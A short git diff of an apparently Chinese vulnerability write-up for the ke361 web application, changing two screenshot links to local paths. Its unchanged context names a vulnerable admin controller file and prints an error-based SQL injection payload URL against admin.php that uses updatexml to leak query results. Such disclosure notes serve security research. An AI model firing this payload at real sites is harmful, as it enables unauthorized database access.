@@ -18,10 +18,10 @@ https://gitee.com/jcove/ke361
 
 存在漏洞的文件为 `Application/Admin/Controller/AuthManagerController.class.php`
 
-![image-20220518153054883](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181530959.png)
+![image-20220518153054883](./images/202205181530959.png)
 
 ```
 /admin.php?s=/AuthManager/group/uid/1')%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
 ```
 
-![image-20220518153112030](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205181531098.png)
+![image-20220518153112030](./images/202205181531098.png)
